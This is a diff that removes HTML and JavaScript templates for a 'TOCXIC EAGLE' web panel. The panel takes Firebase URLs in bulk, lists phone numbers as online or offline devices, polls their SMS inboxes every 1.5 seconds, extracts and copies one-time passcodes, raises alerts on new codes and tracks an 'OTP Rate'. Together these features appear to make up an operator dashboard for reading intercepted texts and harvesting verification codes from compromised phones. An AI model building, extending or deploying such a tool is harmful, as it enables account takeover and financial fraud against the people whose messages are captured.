-const newB = isFresh ? '<span class="new-badge">NEW</span>' : '';
-let typeB = '';
-if(otp) typeB = '<span class="msg-type-badge otp">OTP</span>';
-else if(/[6-9]\\d{9}/.test(m.message||'')) typeB = '<span class="msg-type-badge number">📞 NUM</span>';
-return '<div class="sms-item ' + cls + '">' + typeB +
-'<div class="sms-head"><div class="sender">' + escapeHtml(m.from||'Unknown') + ' ' + newB + '</div>' +
-'<div style="text-align:right"><div class="sms-time ' + (isFresh?'fresh':'') + '">' + escapeHtml(timeStr) + '</div>' +
-'<div class="time-ago ' + (isFresh?'fresh':'') + '">' + timeAgo(ts, now) + '</div></div></div>' +
-'<div class="sms-body">' + body + '</div>' + copyBtn + '</div>'; }).join('') + '</div>'; }
-
-async function markBcRead(id){
-  const b = allBroadcasts.find(x => x.id === id);
-  if(!b || b.read) return;
-  b.read = true;
-  const unread = allBroadcasts.filter(x => !x.read).length;
-  const cnt = document.getElementById('mail-unread-cnt');
-  if(unread > 0){ cnt.style.display = 'inline-block'; cnt.textContent = unread; }
-  else cnt.style.display = 'none';
-  try{ await fetch('/api/broadcasts/read', { method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({id: b.id}) }); }catch(e){}
-  renderMessages();
-}
-
-function backToList(){
-document.getElementById('inbox-view').classList.add('hidden');
-document.getElementById('list-view').classList.remove('hidden');
-if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
-currentNum = null; allBroadcasts = [];
-currentTopNumber = null; updateTopBadge([]); }
-
-function extractOtp(text){ if(!text) return '';
-const t = String(text);
-let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\\d]{0,30}(\\d{4,8})/i);
-if(m) return m[1];
-m = t.match(/(\\d{4,8})[^\\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
-if(m) return m[1]; m = t.match(/#(\\d{4,8})/); if(m) return m[1]; return ''; }
-
-function fmtTime(ts){ if(!ts) return '';
-try{ let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
-const d = new Date(t*1000);
-const opts = { timeZone:'Asia/Kolkata', hour12:true, day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' };
-return d.toLocaleString('en-IN', opts).replace(',', ' |'); }catch(e){ return String(ts); } }
-
-function copyOtp(c){ const done = ()=>toast('✅ Copied: ' + c);
-if(navigator.clipboard) navigator.clipboard.writeText(c).then(done).catch(()=>{
-const ta = document.createElement('textarea'); ta.value = c; document.body.appendChild(ta);
-ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }
-
-function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
-
-checkConn(); loadNumbers();
-setInterval(checkConn, 8000);
-setInterval(()=>{ if(!currentNum) loadNumbers(); }, 5000);
-</script>
-</body></html>"""
-
-
-# ============================================================
-# PERSONAL OTP (public)
-# ============================================================
-PERSONAL_OTP_HTML = """<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>TOCXIC EAGLE — Personal OTP</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<meta name="theme-color" content="#0F3CC9">
-""" + ORBITRON + """
-<style>""" + MOBILE_CSS + BRAND_CSS + """
-.fb-add-card{background:linear-gradient(135deg,#ecfdf5,#d1fae5);border:2px solid #6ee7b7;
-border-radius:18px;padding:18px;margin-bottom:14px}
-.fb-add-card h3{font-size:13px;font-weight:800;color:#065f46;margin-bottom:10px;
-display:flex;align-items:center;gap:8px;font-family:'Orbitron',sans-serif;letter-spacing:1px;
-text-transform:uppercase}
-.fb-add-row{display:flex;gap:8px;flex-wrap:wrap}
-.fb-add-row input{flex:1;min-width:180px;padding:14px 12px;border-radius:10px;
-border:1.5px solid #6ee7b7;background:#fff;outline:none;color:#101828;font-family:monospace}
-.fb-add-row input:focus{border-color:#12b76a;box-shadow:0 0 0 4px rgba(18,183,106,.15)}
-.fb-add-row button{padding:14px 18px;border:none;border-radius:12px;font-weight:800;
-font-size:13px;min-height:50px}
-.fb-add-row button.primary{background:linear-gradient(135deg,#12b76a,#32d583);color:#fff}
-.fb-add-row button.gray{background:rgba(16,24,40,.08);color:#344054}
-.bulk-area{margin-top:10px;display:none}
-.bulk-area textarea{width:100%;padding:14px;border-radius:10px;border:1.5px solid #6ee7b7;
-background:#fff;font-size:13px;min-height:120px;font-family:monospace;outline:none;
-color:#101828;resize:vertical}
-.bulk-area button{margin-top:8px;padding:12px 18px;border:none;border-radius:10px;
-font-weight:800;font-size:13px;background:linear-gradient(135deg,#12b76a,#32d583);
-color:#fff;min-height:48px}
-.fb-msg{margin-top:10px;padding:12px 14px;border-radius:10px;font-size:13px;display:none;font-weight:700}
-.fb-msg.ok{background:rgba(18,183,106,.15);color:#05603a;display:block}
-.fb-msg.err{background:rgba(240,68,56,.12);color:#b42318;display:block}
-.my-fb-list{display:grid;gap:8px;margin-top:10px}
-.my-fb-card{background:#fff;border:1.5px solid var(--sep);border-radius:12px;padding:12px;
-display:flex;align-items:center;gap:10px}
-.my-fb-card .fb-icon{width:38px;height:38px;border-radius:9px;
-background:linear-gradient(135deg,#d1fae5,#a7f3d0);display:flex;align-items:center;
-justify-content:center;font-size:18px;flex-shrink:0}
-.my-fb-card .fb-info{flex:1;min-width:0}
-.my-fb-card .fb-label{font-size:12px;font-weight:800;color:#065f46}
-.my-fb-card .fb-hash{font-size:10px;color:#98a2b3;font-family:monospace;margin-top:2px}
-.my-fb-card .fb-actions button{padding:10px 14px;font-size:12px;background:rgba(240,68,56,.1);
-color:#b42318;border:none;border-radius:8px;font-weight:800;min-height:42px}
-</style></head><body>
-
-<div class="topbar">
-<div class="brand"><span class="eagle">🦅</span>
-<div><span class="name">TOCXIC EAGLE</span><span class="sub">PERSONAL OTP</span></div></div>
-<div class="nav">
-<a href="/" class="nav-link">🏠 Home</a>
-<a href="/user" class="nav-link">📱 Numbers</a>
-<a href="/otp" class="nav-link otp active">🔐 Personal OTP</a>
-</div>
-<div style="display:flex;align-items:center;gap:10px">
-<button onclick="manualRefresh()" style="background:linear-gradient(135deg,#12b76a,#32d583);
-color:#fff;border:none;width:42px;height:42px;border-radius:50%;font-size:18px">🔄</button>
-<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
-<button id="top-num-btn" onclick="showTopNum()" style="display:none; background:linear-gradient(135deg,#fbbf24,#f59e0b); color:#fff; border:none; width:42px; height:42px; border-radius:50%; font-size:18px; align-items:center; justify-content:center; box-shadow:0 4px 12px rgba(251,191,36,0.4);">📞</button>
-</div>
-</div>
-
-<div class="container">
-<div id="list-view">
-<div class="fb-add-card">
-<h3>➕ Add Your Firebase URL</h3>
-<div class="fb-add-row">
-<input id="fb-url" placeholder="https://xxx-default-rtdb.firebaseio.com"
-onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
-<button class="primary" id="add-btn" onclick="addFirebase()">Add</button>
-<button class="gray" id="bulk-toggle" onclick="toggleBulk()">Bulk</button>
-</div>
-<div id="bulk-area" class="bulk-area">
-<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
-<button onclick="bulkAdd()">📥 Import All</button>
-</div>
-<div id="add-msg" class="fb-msg"></div>
-<div class="my-fb-list" id="my-fb-list"></div>
-</div>
-
-<div class="stats">
-<div class="stat total"><div class="label">Total</div><div class="value" id="s-total">0</div></div>
-<div class="stat online"><div class="label">Online</div><div class="value" id="s-online">0</div></div>
-<div class="stat offline"><div class="label">Offline</div><div class="value" id="s-offline">0</div></div>
-<div class="stat otp"><div class="label">OTP Rate</div><div class="value" id="s-otp">0%</div></div>
-</div>
-<div class="quick"><div class="info">📱 Numbers <b id="q-dev">0</b></div></div>
-<div class="num-filter-bar">
-<button class="num-filter-btn active" id="nf-all" onclick="setNumberFilter('all')">All <span class="cnt" id="nf-all-c">0</span></button>
-<button class="num-filter-btn" id="nf-online" onclick="setNumberFilter('online')">🟢 Online <span class="cnt" id="nf-online-c">0</span></button>
-<button class="num-filter-btn" id="nf-offline" onclick="setNumberFilter('offline')">🔴 Offline <span class="cnt" id="nf-offline-c">0</span></button>
-</div>
-<div id="loading-text" class="loading-text">
-<span class="spinner"></span><span id="loading-msg">Add a firebase to start...</span>
-</div>
-<div id="list-content" class="hidden">
-<div class="search-box"><input id="search-num" placeholder="🔎 Search" oninput="renderNumbers()"></div>
-<div class="list-header"><h2>📱 Numbers</h2><span class="count" id="num-count">0</span></div>
-<div id="num-list"></div>
-</div>
-</div>
-
-<div id="inbox-view" class="hidden">
-<div class="inbox-header">
-<div class="inbox-top">
-<a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a>
-<div style="flex:1">
-<div class="inbox-num" id="inbox-num">+91 ------</div>
-<div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div>
-</div>
-</div>
-<div class="inbox-meta">
-<span>⚡ LIVE · auto 1s · Latest 10 SMS</span>
-<span class="refresh-icon" onclick="loadInbox(true)">🔄</span>
-</div>
-<div class="mail-tab-bar" style="margin-top:14px">
-<button class="mail-tab-btn active" id="mt-sms" onclick="setMailTab('sms')">🛜 SMS</button>
-<button class="mail-tab-btn" id="mt-mail" onclick="setMailTab('mail')">📧 Broadcast Mail <span id="mail-unread-cnt" style="display:none;background:#E40000;color:#fff;padding:1px 7px;border-radius:8px;font-size:9px;margin-left:4px;font-weight:900"></span></button>
-</div>
-<div class="filter-bar">
-<button class="filter-btn" id="fb-10m" onclick="setFilter('10m')">⚡ 10 min</button>
-<button class="filter-btn active" id="fb-recent" onclick="setFilter('recent')">🔥 24h</button>
-<button class="filter-btn" id="fb-all" onclick="setFilter('all')">📜 All</button>
-</div>
-</div>
-<div id="sms-container"></div>
-</div>
-</div>
-
-<div id="toast" class="toast"></div>
-
-<script>
-const COOKIE_NAME = "tocxic_eagle_personal_fb_v71";
-let myFbs = [], allNumbers = [], numbers = [], currentNum = null;
-let refreshTimer = null, lastSig = '', lastInboxSig = '', allInboxMsgs = [];
-let currentFilter = 'recent', currentNumberFilter = 'all', currentMailTab = 'sms';
-let lastOtpSeen = '', notifAsked = false;
-let currentTopNumber = null;
-let allBroadcasts = [];
-
-function getCookie(n){ const cs = document.cookie.split(';');
-for(let c of cs){ c = c.trim(); if(c.indexOf(n+'=')===0){ try{ return JSON.parse(decodeURIComponent(c.substring(n.length+1))); } catch(e){ return []; } } }
-return []; }
-function setCookie(n, v, d){ const e = new Date(Date.now() + d*864e5).toUTCString();
-document.cookie = n + '=' + encodeURIComponent(JSON.stringify(v)) + '; expires=' + e + '; path=/; SameSite=Lax'; }
-function saveFbs(){ setCookie(COOKIE_NAME, myFbs, 365); }
-
-function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
-e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2500); }
-
-function playSound(){ try{
-const ctx = new (window.AudioContext||window.webkitAudioContext)();
-[880,1100,880].forEach((f,i)=>{ const o = ctx.createOscillator(), g = ctx.createGain();
-o.connect(g); g.connect(ctx.destination); o.frequency.value = f;
-const t = ctx.currentTime + i*0.2; g.gain.setValueAtTime(0.2,t);
-g.gain.exponentialRampToValueAtTime(0.001,t+0.18); o.start(t); o.stop(t+0.18); }); }catch(e){} }
-
-function askNotif(){ if(notifAsked) return; notifAsked = true;
-if('Notification' in window && Notification.permission === 'default') Notification.requestPermission(); }
-
-function showOtpNotif(otp, from, msg){
-toast('🔔 OTP: ' + otp + ' — ' + from); playSound();
-if('Notification' in window && Notification.permission === 'granted'){
-try{ const n = new Notification('🔔 OTP: ' + otp, { body: from + '\\n' + msg.slice(0,100), tag:'otp-'+otp });
-setTimeout(()=>n.close(), 10000); }catch(e){} }
-if(navigator.vibrate){ try{ navigator.vibrate([200,100,200,100,200]); }catch(e){} } }
-
-async function checkConn(){
-try{ const r = await fetch('/api/conn'); const d = await r.json();
-const b = document.getElementById('conn-badge'), t = document.getElementById('conn-text');
-if(d.mongo_connected){ b.className = 'conn online'; t.textContent = 'Live'; }
-else { b.className = 'conn offline'; t.textContent = 'Off'; } }catch(e){} }
-
-async function manualRefresh(){ toast('🔄 Refreshing...');
-if(myFbs.length > 0) await loadNumbers(); }
-
-function renderFbs(){ const box = document.getElementById('my-fb-list');
-if(myFbs.length === 0){ box.innerHTML = ''; return; }
-box.innerHTML = myFbs.map((fb, i) => '<div class="my-fb-card">' +
-'<div class="fb-icon">🔥</div>' +
-'<div class="fb-info"><div class="fb-label">Firebase #' + (i+1) + '</div>' +
-'<div class="fb-hash">ID: ' + escapeHtml(fb.hash || 'hidden') + '</div></div>' +
-'<div class="fb-actions"><button onclick="removeFb(' + i + ')">🗑 Remove</button></div></div>').join(''); }
-
-function toggleBulk(){ const a = document.getElementById('bulk-area');
-a.style.display = (a.style.display === 'block') ? 'none' : 'block'; }
-
-async function addFirebase(){
-const input = document.getElementById('fb-url');
-let url = input.value.trim();
-if(!url){ showMsg('❌ URL required','err'); return; }
-if(!url.startsWith('http')) url = 'https://' + url;
-url = url.replace(/\\/+$/, '');
-if(!url.includes('firebase')){ showMsg('❌ Invalid firebase URL','err'); return; }
-if(myFbs.some(f => f.url === url)){ showMsg('⚠️ Already added','err'); return; }
-document.getElementById('add-btn').disabled = true;
-showMsg('⏳ Adding...','ok');
-try{ const r = await fetch('/api/otp/add', { method:'POST',
-headers:{'Content-Type':'application/json'}, body: JSON.stringify({url}) });
-const d = await r.json();
-if(d.success){ myFbs.push({url, hash: d.hash || 'hidden'});
-saveFbs(); input.value = ''; showMsg('✅ Added','ok'); renderFbs(); loadNumbers(); }
-else showMsg('❌ ' + (d.error||'Error'),'err'); }
-catch(e){ showMsg('❌ Network error','err'); }
-document.getElementById('add-btn').disabled = false; }
-
-async function bulkAdd(){
-const txt = document.getElementById('fb-bulk').value.trim();
-if(!txt){ showMsg('❌ Empty','err'); return; }
-const urls = txt.split('\\n').map(l => l.trim()).filter(l => l.startsWith('http') || l.includes('firebase'));
-if(!urls.length){ showMsg('❌ No valid URLs','err'); return; }
-showMsg('⏳ Adding ' + urls.length + '...','ok');
-let added = 0, skip = 0, fail = 0;
-for(let i=0; i<urls.length; i++){
-let url = urls[i].trim(); if(!url.startsWith('http')) url = 'https://' + url;
-url = url.replace(/\\/+$/, '');
-if(!url.includes('firebase')){ fail++; continue; }
-if(myFbs.some(f => f.url === url)){ skip++; continue; }
-try{ const r = await fetch('/api/otp/add', { method:'POST',
-headers:{'Content-Type':'application/json'}, body: JSON.stringify({url}) });
-const d = await r.json();
-if(d.success){ myFbs.push({url, hash: d.hash || 'hidden'}); added++; } else fail++; }
-catch(e){ fail++; }
-showMsg('⏳ ' + (i+1) + '/' + urls.length,'ok'); }
-saveFbs(); renderFbs();
-document.getElementById('fb-bulk').value = '';
-document.getElementById('bulk-area').style.display = 'none';
-showMsg('✅ Added: ' + added + ' · Skip: ' + skip + ' · Fail: ' + fail,'ok');
-loadNumbers(); }
-
-function showMsg(t, type){ const e = document.getElementById('add-msg');
-e.className = 'fb-msg ' + type; e.textContent = t;
-if(type === 'ok') setTimeout(()=>{ if(e.textContent.includes('✅')) e.className = 'fb-msg'; }, 4000); }
-
-function removeFb(i){ if(!confirm('Remove this firebase?')) return;
-myFbs.splice(i, 1); saveFbs(); renderFbs();
-if(myFbs.length === 0){ allNumbers = []; numbers = [];
-document.getElementById('list-content').classList.add('hidden');
-document.getElementById('loading-text').classList.remove('hidden');
-document.getElementById('loading-msg').textContent = 'Add a firebase to start...'; }
-else loadNumbers(); toast('✅ Removed'); }
-
-function setNumberFilter(f){ currentNumberFilter = f;
-document.getElementById('nf-all').classList.toggle('active', f==='all');
-document.getElementById('nf-online').classList.toggle('active', f==='online');
-document.getElementById('nf-offline').classList.toggle('active', f==='offline');
-applyFilter(); renderNumbers(); }
-
-function setFilter(f){ currentFilter = f;
-document.getElementById('fb-10m').classList.toggle('active', f==='10m');
-document.getElementById('fb-recent').classList.toggle('active', f==='recent');
-document.getElementById('fb-all').classList.toggle('active', f==='all');
-renderMessages(); }
-
-function setMailTab(t){
-  currentMailTab = t;
-  document.getElementById('mt-sms').classList.toggle('active', t==='sms');
-  document.getElementById('mt-mail').classList.toggle('active', t==='mail');
-  if(t === 'mail'){ loadBroadcasts(currentNum); }
-  renderMessages();
-}
-
-function applyFilter(){
-if(currentNumberFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
-else if(currentNumberFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
-else numbers = allNumbers.slice();
-document.getElementById('num-count').textContent = numbers.length; }
-
-async function loadNumbers(){
-if(myFbs.length === 0){
-document.getElementById('list-content').classList.add('hidden');
-document.getElementById('loading-text').classList.remove('hidden');
-document.getElementById('loading-msg').textContent = 'Add a firebase to start...';
-return; }
-document.getElementById('loading-text').classList.remove('hidden');
-document.getElementById('loading-msg').innerHTML = '<span class="spinner"></span>Loading...';
-try{ const r = await fetch('/api/otp/data', { method:'POST',
-headers:{'Content-Type':'application/json'}, body: JSON.stringify({urls: myFbs.map(f => f.url)}) });
-const d = await r.json();
-if(!d.success){ document.getElementById('loading-msg').textContent = '❌ ' + (d.error||'Error'); return; }
-allNumbers = d.numbers || [];
-document.getElementById('s-total').textContent = d.total || 0;
-document.getElementById('s-online').textContent = d.online || 0;
-document.getElementById('s-offline').textContent = d.offline || 0;
-document.getElementById('s-otp').textContent = (d.otp_rate || 0) + '%';
-document.getElementById('q-dev').textContent = allNumbers.length;
-document.getElementById('nf-all-c').textContent = allNumbers.length;
-document.getElementById('nf-online-c').textContent = d.online || 0;
-document.getElementById('nf-offline-c').textContent = d.offline || 0;
-applyFilter();
-document.getElementById('loading-text').classList.add('hidden');
-document.getElementById('list-content').classList.remove('hidden');
-const sig = allNumbers.length + '|' + (d.online||0) + '|' + currentNumberFilter;
-if(sig !== lastSig){ lastSig = sig; renderNumbers(); } }
-catch(e){ document.getElementById('loading-msg').textContent = '❌ Network error'; } }
-
-function renderNumbers(){
-const q = (document.getElementById('search-num').value || '').toLowerCase();
-const box = document.getElementById('num-list');
-const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) ||
-(n.device_name||'').toLowerCase().includes(q));
-if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 No numbers</div>'; return; }
-box.innerHTML = filtered.map(n => {
-const isOn = n.online === true;
-const isUnk = (n.number||'').startsWith('UNKNOWN-');
-const iconCls = isUnk ? 'gray' : (isOn ? '' : 'red');
-const badgeCls = isOn ? 'badge-online' : 'badge-offline';
-const badgeTxt = isOn ? 'Online' : 'Offline';
-const idx = numbers.indexOf(n);
-return '<div class="num-card">' +
-'<div class="num-icon ' + iconCls + '" onclick="openInboxAt(' + idx + ')">' + (isUnk ? '❓' : '📶') + '</div>' +
-'<div class="num-info" onclick="openInboxAt(' + idx + ')">' +
-'<div class="num-title">' + escapeHtml(n.number) + '</div>' +
-'<div class="num-sub"><span class="pill">📨 ' + n.msg_count + ' SMS</span>' +
-(n.otp_count > 0 ? '<span class="pill otp">🔑 ' + n.otp_count + ' OTP</span>' : '') + '</div></div>' +
-'<div class="' + badgeCls + '" onclick="openInboxAt(' + idx + ')"><span class="dot"></span>' + badgeTxt + '</div>' +
-'<div class="arrow">›</div></div>'; }).join(''); }
-
-function openInboxAt(idx){ if(idx < 0 || idx >= numbers.length) return; openInbox(numbers[idx]); }
-
-async function openInbox(n){
-currentNum = n; lastInboxSig = ''; allInboxMsgs = []; allBroadcasts = [];
-currentFilter = 'recent'; lastOtpSeen = ''; currentMailTab = 'sms';
-currentTopNumber = null; updateTopBadge([]);
-askNotif();
-document.getElementById('fb-10m').classList.remove('active');
-document.getElementById('fb-recent').classList.add('active');
-document.getElementById('fb-all').classList.remove('active');
-document.getElementById('mt-sms').classList.add('active');
-document.getElementById('mt-mail').classList.remove('active');
-document.getElementById('list-view').classList.add('hidden');
-document.getElementById('inbox-view').classList.remove('hidden');
-document.getElementById('inbox-num').textContent = n.number;
-const statusEl = document.getElementById('inbox-status');
-const statusTxt = document.getElementById('inbox-status-text');
-if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
-else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
-document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
-await Promise.all([ loadInbox(false), loadBroadcasts(n) ]);
-if(refreshTimer) clearInterval(refreshTimer);
-refreshTimer = setInterval(()=>{ if(currentMailTab === 'sms') loadInbox(false); }, 1500);
-}
-
-async function loadBroadcasts(n){
-  if(!n) return;
-  try{
-    const r = await fetch('/api/broadcasts/inbox?device_id=' + encodeURIComponent(n.device_id) +
-                          '&fb=' + encodeURIComponent(n.firebase) +
-                          '&num=' + encodeURIComponent(n.number));
-    const d = await r.json();
-    if(d.success){
-      allBroadcasts = d.broadcasts || [];
-      const unread = allBroadcasts.filter(b => !b.read).length;
-      const cnt = document.getElementById('mail-unread-cnt');
-      if(unread > 0){ cnt.style.display = 'inline-block'; cnt.textContent = unread; }
-      else cnt.style.display = 'none';
-      if(currentMailTab === 'mail') renderMessages();
-    }
-  }catch(e){}
-}
-
-function findTop(msgs){ const counter = {}, senders = new Set();
-msgs.forEach(m => { for(const n of (m.from||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []) senders.add(n); });
-msgs.forEach(m => { for(const n of (m.message||'').match(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g) || []){
-if(senders.has(n)) continue; if(n.startsWith('1800')||n.startsWith('1900')||n.startsWith('1991')) continue;
-counter[n] = (counter[n]||0) + 1; } });
-let top = null, cnt = 0;
-for(const [n, c] of Object.entries(counter)) if(c > cnt){ top = n; cnt = c; }
-return top ? {number: top, count: cnt} : null; }
-
-function updateTopBadge(msgs){
-const btn = document.getElementById('top-num-btn');
-if(!btn) return;
-const t = findTop(msgs);
-if(t && t.count >= 2){ currentTopNumber = t.number; btn.style.display = 'inline-flex'; }
-else { currentTopNumber = null; btn.style.display = 'none'; }
-}
-
-function showTopNum(){
-if(currentTopNumber){
-toast('📞 Top Number: ' + currentTopNumber);
-if(navigator.clipboard) navigator.clipboard.writeText(currentTopNumber);
-} else { toast('❌ Koi frequent number nahi mila'); }
-}
-
-async function loadInbox(showLoader){
-if(!currentNum) return;
-if(showLoader) document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>';
-const c = new AbortController(); const tid = setTimeout(()=>c.abort(), 15000);
-try{ const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) +
-'&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number),
-{ signal: c.signal }); clearTimeout(tid);
-const d = await r.json();
-if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ ' + (d.error||'Error') + '</div>'; return; }
-const msgs = d.messages || []; allInboxMsgs = msgs;
-if(msgs.length > 0){ const newest = msgs[0];
-const otp = newest.otp || extractOtp(newest.message);
-const sig = (newest.timestamp||0) + '|' + otp + '|' + (newest.message||'').slice(0,40);
-if(otp && sig !== lastOtpSeen){ lastOtpSeen = sig; showOtpNotif(otp, newest.from||'Unknown', newest.message||''); } }
-const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
-if(sig !== lastInboxSig){ lastInboxSig = sig; if(currentMailTab === 'sms') renderMessages(); }
-}catch(e){ clearTimeout(tid); } }
-
-function timeAgo(ts, now){
-if(!ts) return ''; const d = now - ts;
-if(d < 10) return 'अभी'; if(d < 60) return d + 's';
-if(d < 3600) return Math.floor(d/60) + 'm'; if(d < 86400) return Math.floor(d/3600) + 'h';
-return Math.floor(d/86400) + 'd'; }
-
-function highlightPhones(t){ return t.replace(/(?<!\\d)([6-9]\\d{9})(?!\\d)/g, '<span class="phone-highlight">$1</span>'); }
-
-function renderMessages(){
-const box = document.getElementById('sms-container');
-const now = Math.floor(Date.now()/1000);
-
-if(currentMailTab === 'mail'){
-  if(!allBroadcasts.length){
-    box.innerHTML = '<div class="empty">📭 No broadcast mail received yet</div>';
-    return;
-  }
-  let list = [...allBroadcasts].sort((a,b) => (b.created_at||0) - (a.created_at||0)).slice(0, 50);
-  box.innerHTML = '<div class="sms-list">' + list.map(b => {
-    const isFresh = (b.created_at||0) >= now - 120;
-    const timeStr = fmtTime(b.created_at);
-    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
-    const unreadDot = !b.read ? ' ●' : '';
-    return '<div class="sms-item mail-item ' + (isFresh?'fresh':'') + '" onclick="markBcRead(\\'' + b.id + '\\')">' +
-      '<div class="msg-type-badge mail">📧 MAIL</div>' +
-      '<div class="sms-head"><div class="sender mail-sender">📧 ADMIN BROADCAST' + unreadDot + ' ' + newBadge + '</div>' +
-      '<div style="text-align:right"><div class="sms-time ' + (isFresh?'fresh':'') + '">' + escapeHtml(timeStr) + '</div>' +
-      '<div class="time-ago ' + (isFresh?'fresh':'') + '">' + timeAgo(b.created_at, now) + '</div></div></div>' +
-      '<div class="sms-body">' + escapeHtml(b.message || '') + '</div></div>';
-  }).join('') + '</div>';
-  return;
-}
-
-let msgs = allInboxMsgs;
-if(currentFilter === '10m') msgs = msgs.filter(m => (m.timestamp||0) >= now - 600);
-else if(currentFilter === 'recent') msgs = msgs.filter(m => (m.timestamp||0) >= now - 86400);
-msgs = [...msgs].sort((a,b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 10);
-updateTopBadge(msgs);
-if(!msgs.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
-box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
-const otp = m.otp || extractOtp(m.message);
-let body = otp ? escapeHtml(m.message).replace(otp, '<span class="otp-highlight">' + otp + '</span>') : escapeHtml(m.message);
-body = highlightPhones(body);
-const copyBtn = otp ? '<button class="otp-copy-btn" onclick="event.stopPropagation();copyOtp(\\'' + otp + '\\')">📋 Copy OTP ' + otp + '</button>' : '';
-const ts = m.timestamp || 0; const isFresh = ts >= now - 120;
-const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
-const timeStr = m.date_string || fmtTime(ts);
-const newB = isFresh ? '<span class="new-badge">NEW</span>' : '';
-let typeB = '';
-if(otp) typeB = '<span class="msg-type-badge otp">OTP</span>';
-else if(/[6-9]\\d{9}/.test(m.message||'')) typeB = '<span class="msg-type-badge number">📞 NUM</span>';
-return '<div class="sms-item ' + cls + '">' + typeB +
-'<div class="sms-head"><div class="sender">' + escapeHtml(m.from||'Unknown') + ' ' + newB + '</div>' +
-'<div style="text-align:right"><div class="sms-time ' + (isFresh?'fresh':'') + '">' + escapeHtml(timeStr) + '</div>' +
-'<div class="time-ago ' + (isFresh?'fresh':'') + '">' + timeAgo(ts, now) + '</div></div></div>' +
-'<div class="sms-body">' + body + '</div>' + copyBtn + '</div>'; }).join('') + '</div>'; }
-
-async function markBcRead(id){
-  const b = allBroadcasts.find(x => x.id === id);
-  if(!b || b.read) return;
-  b.read = true;
-  const unread = allBroadcasts.filter(x => !x.read).length;
-  const cnt = document.getElementById('mail-unread-cnt');
-  if(unread > 0){ cnt.style.display = 'inline-block'; cnt.textContent = unread; }
-  else cnt.style.display = 'none';
-  try{ await fetch('/api/broadcasts/read', { method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({id: b.id}) }); }catch(e){}
-  renderMessages();
-}
-
-function backToList(){
-document.getElementById('inbox-view').classList.add('hidden');
-document.getElementById('list-view').classList.remove('hidden');
-if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
-currentNum = null; allBroadcasts = [];
-currentTopNumber = null; updateTopBadge([]); }
-
-function extractOtp(text){ if(!text) return '';
-const t = String(text);
-let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\\d]{0,30}(\\d{4,8})/i);
-if(m) return m[1];
-m = t.match(/(\\d{4,8})[^\\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
-if(m) return m[1]; m = t.match(/#(\\d{4,8})/); if(m) return m[1]; return ''; }
-
-function fmtTime(ts){ if(!ts) return '';
-try{ let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
-const d = new Date(t*1000);
-const opts = { timeZone:'Asia/Kolkata', hour12:true, day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit' };
-return d.toLocaleString('en-IN', opts).replace(',', ' |'); }catch(e){ return String(ts); } }
-
-function copyOtp(c){ const done = ()=>toast('✅ Copied: ' + c);
-if(navigator.clipboard) navigator.clipboard.writeText(c).then(done).catch(()=>{
-const ta = document.createElement('textarea'); ta.value = c; document.body.appendChild(ta);
-ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }
-
-function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
-
-try{ const raw = getCookie(COOKIE_NAME) || [];
-if(Array.isArray(raw)) myFbs = raw.map(x => typeof x === 'string' ? {url:x, hash:'hidden'} : x);
-}catch(e){ myFbs = []; }
-
-renderFbs(); checkConn();
-if(myFbs.length > 0) loadNumbers();
-setInterval(checkConn, 8000);
-setInterval(()=>{ if(myFbs.length > 0 && !currentNum) loadNumbers(); }, 10000);
-</script>
-</body></html>"""
-
-
-# ============================================================
-# ADMIN DASHBOARD — with 📧 FAB + Broadcast Modal
-# ============================================================
-ADMIN_DASHBOARD_HTML = """<!DOCTYPE html>
